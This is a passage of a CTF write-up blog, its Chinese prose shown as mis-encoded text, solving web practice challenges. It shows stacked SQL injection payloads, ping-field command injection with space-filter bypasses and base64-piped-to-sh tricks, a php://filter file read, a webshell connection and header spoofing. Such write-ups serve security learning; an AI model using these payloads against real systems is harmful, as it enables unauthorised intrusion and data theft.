        <h3 id="3-ä¿®æ”¹flagä¸ºdataå­—æ®µ"   >
          <a href="#3-ä¿®æ”¹flagä¸ºdataå­—æ®µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹flagä¸ºdataå­—æ®µ" class="headerlink" title="(3)ä¿®æ”¹flagä¸ºdataå­—æ®µ"></a>(3)ä¿®æ”¹flagä¸ºdataå­—æ®µ</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>


        <h3 id="æ€»çš„payload"   >
          <a href="#æ€»çš„payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»çš„payload" class="headerlink" title="æ€»çš„payload"></a>æ€»çš„payload</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></div></figure>

<p>æœ€åè¾“å…¥1æäº¤å³å¯</p>

        <h2 id="2-è§£æ³•äºŒ-openå’Œhandler"   >
          <a href="#2-è§£æ³•äºŒ-openå’Œhandler" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è§£æ³•äºŒ-openå’Œhandler" class="headerlink" title="2.è§£æ³•äºŒ(openå’Œhandler)"></a>2.è§£æ³•äºŒ(openå’Œhandler)</h2>
      <p>åˆ©ç”¨openå’Œhandleå…³é”®å­—</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å¯ä»¥ç›´æ¥è¯»å‡ºæ¥è¡¨<code>1919810931114514</code>çš„æ‰€æœ‰å†…å®¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png" alt="image-20220107171100441"></p>

        <h2 id="3-è§£æ³•ä¸‰-MySQLçš„é¢„å¤„ç†"   >
          <a href="#3-è§£æ³•ä¸‰-MySQLçš„é¢„å¤„ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è§£æ³•ä¸‰-MySQLçš„é¢„å¤„ç†" class="headerlink" title="3.è§£æ³•ä¸‰(MySQLçš„é¢„å¤„ç†)"></a>3.è§£æ³•ä¸‰(MySQLçš„é¢„å¤„ç†)</h2>
      <p>åˆ©ç”¨é¢„å¤„ç†æœºåˆ¶prepareå’Œconcatæ‹¼æ¥è·å¾—selectæ“ä½œï¼Œä¹‹åexecuteæ¥æ‰§è¡Œï¼Œè¿™é‡Œå¥½åƒä¸èƒ½å°å†™ï¼Œå¯ä»¥é€šè¿‡å¤§å†™æ¥ç»•è¿‡</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?inject=&#x27;;PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514` </span><br><span class="line">&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png" alt="image-20220107171702374"></p>

        <h1 id="å…­ã€-SUCTF-2019-EasySQL"   >
          <a href="#å…­ã€-SUCTF-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…­ã€-SUCTF-2019-EasySQL" class="headerlink" title="å…­ã€[SUCTF 2019]EasySQL"></a>å…­ã€[SUCTF 2019]EasySQL</h1>
      <p>æ¶‰åŠçŸ¥è¯†ç‚¹æœ‰ç‚¹å¤š</p>

        <h1 id="ä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-Exec"   >
          <a href="#ä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-Exec" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸ƒã€-ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1>
      
        <h2 id="ğŸ”ºå‘½ä»¤æ‰§è¡Œ-å¯»æ‰¾flag"   >
          <a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ-å¯»æ‰¾flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ-å¯»æ‰¾flag" class="headerlink" title="ğŸ”ºå‘½ä»¤æ‰§è¡Œ+å¯»æ‰¾flag"></a>ğŸ”ºå‘½ä»¤æ‰§è¡Œ+å¯»æ‰¾flag</h2>
      
        <h2 id="1-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"   >
          <a href="#1-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1.è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>1.è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h2>
      <p>ä¸€èˆ¬è¿™ç§pingçš„ç•Œé¢ï¼Œéƒ½å¯èƒ½ä¼šæ¶‰åŠåˆ°å‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png" alt="image-20220109120351450"></p>
<p>é‚£ä¹ˆç›´æ¥å°è¯•ä¸€ä¸‹å³å¯ï¼Œpingä¸€ä¸‹æœ¬åœ°å›ç¯åœ°å€</p>
<p>è¾“å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;pwd</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png" alt="image-20220109120428320"></p>
<p>å¯ä»¥çœ‹åˆ°å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å°è¯•æ‰¾flagåœ¨å“ªï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªè·¯å¾„æœç´¢ã€‚</p>

        <h2 id="2-æœç´¢flagè·¯å¾„"   >
          <a href="#2-æœç´¢flagè·¯å¾„" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœç´¢flagè·¯å¾„" class="headerlink" title="2.æœç´¢flagè·¯å¾„"></a>2.æœç´¢flagè·¯å¾„</h2>
      <p>è¾“å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png" alt="image-20220109120604954"></p>
<p>é‚£ä¹ˆå»æ ¹ç›®å½•æ‰¾</p>
<p>è¾“å…¥</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls /</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png" alt="image-20220109120649283"></p>
<p>å¯ä»¥çœ‹åˆ°flagï¼Œé‚£ä¹ˆç›´æ¥catå³å¯</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat /flag</span><br></pre></td></tr></table></div></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png" alt="image-20220109120742963"></p>

        <h1 id="å…«ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"   >
          <a href="#å…«ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…«ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h1>
      
        <h2 id="ğŸ”ºæŠ“åŒ…-ä¼ªåè®®"   >
          <a href="#ğŸ”ºæŠ“åŒ…-ä¼ªåè®®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæŠ“åŒ…-ä¼ªåè®®" class="headerlink" title="ğŸ”ºæŠ“åŒ…+ä¼ªåè®®"></a>ğŸ”ºæŠ“åŒ…+ä¼ªåè®®</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢"   >
          <a href="#1-å‰æœŸæ¢ç´¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>æŸ¥çœ‹æºä»£ç ï¼Œæœ‰å¦‚ä¸‹æ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png" alt="image-20220109121055447"></p>
<p>æ¥ç€æŒ‰ç…§æç¤ºï¼Œä½†æ˜¯ç›´æ¥è·³è½¬åˆ°äº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png" alt="image-20220109121144475"></p>
<p>é‚£ä¹ˆä¸­é—´å¯èƒ½æ‰§è¡Œå¤ªå¿«ï¼Œè¿™æ—¶å€™å°±éœ€è¦æŠ“åŒ…æ¥çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ã€‚</p>

        <h2 id="2-æŠ“åŒ…"   >
          <a href="#2-æŠ“åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æŠ“åŒ…" class="headerlink" title="2.æŠ“åŒ…"></a>2.æŠ“åŒ…</h2>
      <p>ç”¨BurpSuitæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ªaction.phpï¼Œé‡Œé¢æœ‰ä¸ªsecr3t.phpçš„æç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png" alt="image-20220109183459387"></p>
<p>è®¿é—®ä¸€ä¸‹secr3t.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png" alt="image-20220109183542434"></p>
<p>æç¤ºæ”¾åœ¨äº†flag.phpï¼Œè®¿é—®ä¹‹åå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png" alt="image-20220109183616033"></p>
<p>é‚£ä¹ˆè¿™é‡Œç”±äºsecr3t.phpå­˜åœ¨fileçš„åè®®ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨phpä¼ªåè®®è·å–flag.phpçš„æºä»£ç </p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png" alt="image-20220109183730031"></p>
<p>æ‹¿åˆ°CyberChefè§£å¯†ï¼Œå¾—åˆ°flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png" alt="image-20220109183825033"></p>

        <h1 id="ä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"   >
          <a href="#ä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¹ã€-æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="ä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>ä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h1>
      
        <h1 id="åã€-GXYCTF2019-Ping-Ping-Ping"   >
          <a href="#åã€-GXYCTF2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#åã€-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="åã€[GXYCTF2019]Ping Ping Ping"></a>åã€[GXYCTF2019]Ping Ping Ping</h1>
      
        <h2 id="ğŸ”ºå‘½ä»¤æ‰§è¡Œ"   >
          <a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ğŸ”ºå‘½ä»¤æ‰§è¡Œ"></a>ğŸ”ºå‘½ä»¤æ‰§è¡Œ</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-1"   >
          <a href="#1-å‰æœŸæ¢ç´¢-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-1" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>Pingæç¤º+ipï¼Œåº”è¯¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥lsè¯•è¯•</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;ls</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png" alt="image-20220110200315404"></p>
<p>å‘ç°flagï¼Œå°è¯•cat</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png" alt="image-20220110200415489"></p>

        <h2 id="2-ç»•è¿‡è¿‡æ»¤"   >
          <a href="#2-ç»•è¿‡è¿‡æ»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»•è¿‡è¿‡æ»¤" class="headerlink" title="2.ç»•è¿‡è¿‡æ»¤"></a>2.ç»•è¿‡è¿‡æ»¤</h2>
      <p>åº”è¯¥æ˜¯è¿‡æ»¤çš„ç©ºæ ¼</p>
<p>â–²ç»•è¿‡ç©ºæ ¼ï¼šä¸€èˆ¬æ€è·¯å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //å…¶ä¸­é‚£ä¸ª1åŠ å…¶ä»–çš„åº”è¯¥éƒ½è¡Œ</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">$20</span><br><span class="line">$09(ç©ºå­—ç¬¦)</span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒ[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/12313368.html" >GXYCTF2019]Ping Ping Ping - æ˜¥å‘Šé³¥ - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ä½¿ç”¨<code>$IFS</code>å¯ä»¥ï¼Œä½†æ˜¯åˆå‘ç°è¿‡æ»¤äº†flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png" alt="image-20220110202147216"></p>
<p>é‚£ä¹ˆæ¥ä¸‹çš„è§£æ³•å°±å¤šç§å¤šæ ·äº†ã€‚</p>

        <h3 id="è§£æ³•ä¸€ï¼šæ‹¼æ¥flag"   >
          <a href="#è§£æ³•ä¸€ï¼šæ‹¼æ¥flag" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸€ï¼šæ‹¼æ¥flag" class="headerlink" title="è§£æ³•ä¸€ï¼šæ‹¼æ¥flag"></a>è§£æ³•ä¸€ï¼šæ‹¼æ¥flag</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;b=ag.php;a=fl;cat$IFS$1$a$b</span><br></pre></td></tr></table></div></figure>

<p>flagåœ¨æ³¨é‡Šé‡Œï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png" alt="image-20220111112715736"></p>

        <h3 id="è§£æ³•äºŒï¼šshç»“åˆbase64"   >
          <a href="#è§£æ³•äºŒï¼šshç»“åˆbase64" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•äºŒï¼šshç»“åˆbase64" class="headerlink" title="è§£æ³•äºŒï¼šshç»“åˆbase64"></a>è§£æ³•äºŒï¼šshç»“åˆbase64</h3>
      
        <h4 id="â–²linuxè‡ªå¸¦base64å’Œbase32"   >
          <a href="#â–²linuxè‡ªå¸¦base64å’Œbase32" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²linuxè‡ªå¸¦base64å’Œbase32" class="headerlink" title="â–²linuxè‡ªå¸¦base64å’Œbase32"></a>â–²linuxè‡ªå¸¦base64å’Œbase32</h4>
      <p>ç”±äºlinuxçš„shè‡ªå¸¦base64çš„åŠ è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥base64çš„å¯†æ–‡ï¼Œç„¶ååˆ©ç”¨linuxçš„shç»ˆç«¯è‡ªå¸¦çš„base64è§£å¯†åŠŸèƒ½è¿›è¡Œè§£å¯†ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡å¾ˆå¤šè¿‡æ»¤ï¼Œå¦å¤–base32ä¹Ÿå¯ä»¥</p>

        <h4 id="1-base64åŠ å¯†"   >
          <a href="#1-base64åŠ å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-base64åŠ å¯†" class="headerlink" title="(1)base64åŠ å¯†"></a>(1)base64åŠ å¯†</h4>
      <p>ä½¿ç”¨CyberChefæˆ–è€…linuxå‘½ä»¤è¡Œéƒ½è¡Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png" alt="image-20220111113614306"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png" alt="image-20220111113634402"></p>

        <h4 id="2-base64è§£å¯†"   >
          <a href="#2-base64è§£å¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-base64è§£å¯†" class="headerlink" title="(2)base64è§£å¯†"></a>(2)base64è§£å¯†</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</span><br></pre></td></tr></table></div></figure>

<p>å°†ä¹‹å‰åŠ å¯†çš„â€cat flag.phpâ€ä¼ ç»™base64è§£å¯†ï¼Œç„¶åshæ‰§è¡Œ</p>
<p>å¯¹åº”å†™åœ¨URLä¸Šå³ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh</span><br></pre></td></tr></table></div></figure>


        <h3 id="è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ"   >
          <a href="#è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ" class="headerlink" title="è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ"></a>è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ</h3>
      <p>å‘½ä»¤ä¸­ä¼šå…ˆæ‰§è¡Œåå¼•å·é‡Œçš„ï¼Œç„¶åå°†è¾“å…¥ç»“æœä¾æ¬¡ä¼ é€’ç»™å…¶ä»–å‘½ä»¤è¿›è¡Œæ‰§è¡Œ</p>
<p>ç”±äºflagå°±åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat `ls`;</span><br><span class="line"><span class="comment">#å…ˆæ‰§è¡Œlsè¾“å‡º index.php å’Œ flag.phpï¼Œä¹‹åå°†è¾“å…¥ç»“æœç»™åˆ°catå‘½ä»¤ï¼Œç›¸å½“äºå†æ‰§è¡Œ cat index.php;cat flag.php</span></span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”URLä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></div></figure>


        <h2 id="â–²å…¶ä»–"   >
          <a href="#â–²å…¶ä»–" class="heading-link"><i class="fas fa-link"></i></a><a href="#â–²å…¶ä»–" class="headerlink" title="â–²å…¶ä»–"></a>â–²å…¶ä»–</h2>
      <p>æ­¤å¤–å‘½ä»¤æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥ç»•è¿‡ï¼Œè¿™é‡Œbanæ‰äº†å¾ˆå¤šï¼Œåƒ<code>&lt;</code>ï¼Œ<code>\</code>ç­‰éƒ½æ˜¯æœ‰å¯èƒ½</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/GLory-LTF/p/15359485.html" >å‘½ä»¤æ‰§è¡Œç»•è¿‡çš„æ–¹æ³• - GLCC - åšå®¢å›­ (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife"   >
          <a href="#åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸€ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h1>
      
        <h2 id="ğŸ”ºä¸€å¥è¯æœ¨é©¬"   >
          <a href="#ğŸ”ºä¸€å¥è¯æœ¨é©¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºä¸€å¥è¯æœ¨é©¬" class="headerlink" title="ğŸ”ºä¸€å¥è¯æœ¨é©¬"></a>ğŸ”ºä¸€å¥è¯æœ¨é©¬</h2>
      <p>ä¾æ®æç¤ºä»¥åŠå¦‚ä¸‹çš„è¯­å¥ï¼ŒçŒœæµ‹æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå¯†ç ä¸ºSyc</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png" alt="image-20220111144925504"></p>
<p>ä½¿ç”¨èšå‰‘è¿æ¥</p>
<p>èšå‰‘æ•™ç¨‹ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/srruro" >è·å–èšå‰‘ Â· è¯­é›€ (yuque.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ç„¶åç›´æ¥å¤åˆ¶URLè¿›è¡Œè¿æ¥å³å¯ï¼Œå³é”®-&gt;æ·»åŠ æ•°æ®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png" alt="image-20220111145119474"></p>
<p>è¿›å»ä¹‹åè¿›å…¥æ ¹ç›®å½•å¯»æ‰¾flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png" alt="image-20220111145143729"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png" alt="image-20220111145208831"></p>

        <h1 id="åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http"   >
          <a href="#åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="heading-link"><i class="fas fa-link"></i></a><a href="#åäºŒã€-æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1>
      
        <h2 id="ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´"   >
          <a href="#ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´" class="headerlink" title="ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´"></a>ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´</h2>
      
        <h2 id="1-å‰æœŸæ¢ç´¢-2"   >
          <a href="#1-å‰æœŸæ¢ç´¢-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰æœŸæ¢ç´¢-2" class="headerlink" title="1.å‰æœŸæ¢ç´¢"></a>1.å‰æœŸæ¢ç´¢</h2>
      <p>ç›´æ¥æºä»£ç ï¼Œæœç´¢.phpï¼Œå‘ç°ä¸€ä¸ªSecrect.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png" alt="image-20220111141159974"></p>
<p>ç„¶åè®¿é—®ï¼Œå‘ç°éœ€è¦ä»<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cnè®¿é—®æ‰è¡Œ/" >https://Sycsecret.buuoj.cnè®¿é—®æ‰è¡Œ</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png" alt="image-20220111141218518"></p>
<p>é‚£ä¹ˆå°±ä½¿ç”¨BurpSuiteè¿›è¡Œä¿®æ”¹</p>

        <h2 id="2-BurpSuiteä½¿ç”¨æ”¹åŒ…"   >
          <a href="#2-BurpSuiteä½¿ç”¨æ”¹åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-BurpSuiteä½¿ç”¨æ”¹åŒ…" class="headerlink" title="2.BurpSuiteä½¿ç”¨æ”¹åŒ…"></a>2.BurpSuiteä½¿ç”¨æ”¹åŒ…</h2>
      <p>é¦–å…ˆæµè§ˆå™¨å¼€å¯ä»£ç†ï¼ŒBurpSuiteæŠ“åˆ°åŒ…</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png" alt="image-20220111141339457"></p>
<p>ç„¶åå°†åŒ…å‘é€åˆ°<code>repeater</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png" alt="image-20220111141424655"></p>
<p>åœ¨Repeateræœ€æ–°å‡ºç°çš„ä¸€éƒ¨åˆ†å°±æ˜¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png" alt="image-20220111141531436"></p>

        <h3 id="1-ä¿®æ”¹Referer"   >
          <a href="#1-ä¿®æ”¹Referer" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¿®æ”¹Referer" class="headerlink" title="(1)ä¿®æ”¹Referer"></a>(1)ä¿®æ”¹Referer</h3>
      <p>ç”±äºè¯´è¦ä»<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://sycsecret.buuoj.cnè®¿é—®,æ‰€ä»¥æ·»åŠ å¦‚ä¸‹,åœ¨getä¸‹æ·»åŠ /" >https://Sycsecret.buuoj.cnè®¿é—®ï¼Œæ‰€ä»¥æ·»åŠ å¦‚ä¸‹ï¼Œåœ¨Getä¸‹æ·»åŠ </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png" alt="image-20220111141726767"></p>
<p>ç‚¹å‡»GoæŒ‰é’®å‘é€åŒ…</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png" alt="image-20220111141823417"></p>
